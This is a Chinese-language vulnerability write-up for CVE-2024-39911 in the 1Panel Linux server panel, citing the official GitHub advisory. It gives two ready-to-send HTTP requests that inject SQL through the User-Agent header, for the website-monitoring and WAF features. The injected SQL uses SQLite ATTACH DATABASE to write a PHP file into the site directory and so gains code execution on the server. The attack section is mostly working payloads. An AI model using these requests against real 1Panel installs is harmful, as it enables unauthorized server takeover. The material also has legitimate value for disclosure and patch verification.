# 1Panel面板最新前台RCE漏洞(CVE-2024-39911)

**1Panel 是新一代的 Linux 服务器运维管理面板，用户可以通过 Web 图形界面轻松管理 Linux 服务器，实现主机监控、文件管理、数据库管理、容器管理等功能。且深度集成开源建站软件 WordPress 和 Halo.**

## 0x1 测试版本

专业版 v1.10.10-lts
社区版 v1.10.10-lts
1panel/openresty:1.21.4.3-3-1-focal

## 0x2 影响范围

网站监控功能影响 == 1panel/openresty:1.21.4.3-3-1-focal
WAF功能影响 <= 1panel/openresty:1.21.4.3-3-1-focal

## 0x3 题外话

具体测试/发现过程在 `https://blog.mo60.cn/index.php/archives/1Panel_SQLinjection2Rce.html` 有兴趣的大佬们可以看看

## 0x4 网站监控功能GetShell

利用条件:

- 专业版,并开启网站监控功能
- 关闭waf功能
- 安装有1P-openresty容器且搭建有php环境网站

默认网站路径格式如下，这个路径是在op容器里面的路径

```
/www/sites/网站代号(默认为域名)/index/
```



通过sql注入导出文件到网站路径下

```yaml
GET / HTTP/1.1
Host: 192.168.99.6
User-Agent: ua', 'blog.mo60.cn', 5201314, '', '', 1, '2024-06-09 08:16:52', 1817921010.847, '/AAAAAAA', 52014, '2025-06-09', '16', '', '', 'Linux', 'edge', 'pc', '', '');ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?= md5("blog.mo60.cn"); ?>');#
```



然后来到网站路径下可以看到我们写入的文件

[![image](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407190936858.png)](https://private-user-images.githubusercontent.com/103053746/338056404-4c64d116-6187-4661-8e9e-d3ae21b189bd.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MjEzNTMyMzYsIm5iZiI6MTcyMTM1MjkzNiwicGF0aCI6Ii8xMDMwNTM3NDYvMzM4MDU2NDA0LTRjNjRkMTE2LTYxODctNDY2MS04ZTllLWQzYWUyMWIxODliZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwNzE5JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDcxOVQwMTM1MzZaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0yYWU1MjIyZmFiMzIwNzI1Yzg1NzQxN2JlNTMwODM5MjlmM2QwNDY5ZGRiZWFkYWU5YTliNDYyZjAyZjAyZWM4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.xjt8TbyhsjYoiHzeUd26xnyhwMIoC7sjLAy4pM6oB0c)

访问发现成功输出blog.mo60.cn 的md5值，成功执行代码

[![image](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407190936869.png)](https://private-user-images.githubusercontent.com/103053746/338056240-52bc1681-bba4-4e50-bca5-3a1a2821eb8f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MjEzNTMyMzYsIm5iZiI6MTcyMTM1MjkzNiwicGF0aCI6Ii8xMDMwNTM3NDYvMzM4MDU2MjQwLTUyYmMxNjgxLWJiYTQtNGU1MC1iY2E1LTNhMWEyODIxZWI4Zi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwNzE5JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDcxOVQwMTM1MzZaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0xOWNkYmUyMjc2NTFiMjNiNTMxMzVhMDgyODBiMmEyMTEwNmFiYTM3ZDY2OTczMGNjZGE3NGRiYTVhOGE0ZTUwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.w-QHDxXdU-6bvX0VL-Bk54sB4XcCdIpj4NAYhvV2hy8)

## 0x5 Waf功能

利用条件:

- 开启waf功能
- 安装有1P-openresty容器且搭建有php环境网站

发送后即可成功写入文件

```yaml
GET /.git/config HTTP/1.1
Host: 192.168.99.6
User-Agent: blog.mo60.cn',"args", "sqlInjectA", "", "YmxvZy5tbzYwLmNu", "blog.mo60.cn", 0, "deny", 0, 1);ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?= md5("blog.mo60.cn"); ?>');#
Connection: close
```



## 漏洞来源

- https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-7m53-pwp6-v3f5